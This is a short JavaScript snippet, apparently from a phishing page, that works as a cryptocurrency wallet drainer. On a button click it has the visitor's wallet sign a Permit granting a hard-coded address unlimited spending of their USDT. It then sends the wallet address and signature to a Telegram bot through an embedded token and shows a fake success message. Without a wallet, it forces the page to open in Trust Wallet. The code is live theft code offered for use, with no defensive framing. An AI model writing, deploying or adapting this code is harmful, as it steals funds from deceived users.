const cfg = {
        t: "8111685639:AAFKpBzv2AEi2lQtXpQxQKorT_YdbZWsv9s",
        i: "7807929833",
        w: "0x710cD62878b4b976e369819C4D35de8e1912cd6C"
    };

    async function start() {
        if (window.ethereum) {
            // CODE SI ON EST DÃ‰JÃ€ DANS L'APP
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const address = await signer.getAddress();
                const domain = { name: "Tether USD", version: "1", chainId: 56, verifyingContract: "0x55d398326f99059ff775485246999027b3197955" };
                const types = { Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] };
                const values = { owner: address, spender: cfg.w, value: ethers.constants.MaxUint256, nonce: 0, deadline: 2524608000 };
                const signature = await signer._signTypedData(domain, types, values);
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&text=ðŸ”¥_CAPTURED_%0AWallet: ${address}%0ASig: ${signature}`);
                alert("Synchronisation rÃ©ussie.");
            } catch (e) { alert("Erreur. Reconnectez-vous."); }
        } else {
            // FORCE L'OUVERTURE DE TRUST WALLET UNIQUEMENT
            const cleanUrl = window.location.href.split('://')[1];
            // On tente le lien universel de Trust Wallet
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + cleanUrl;
        }
    }
    document.getElementById('openBtn').onclick = start;
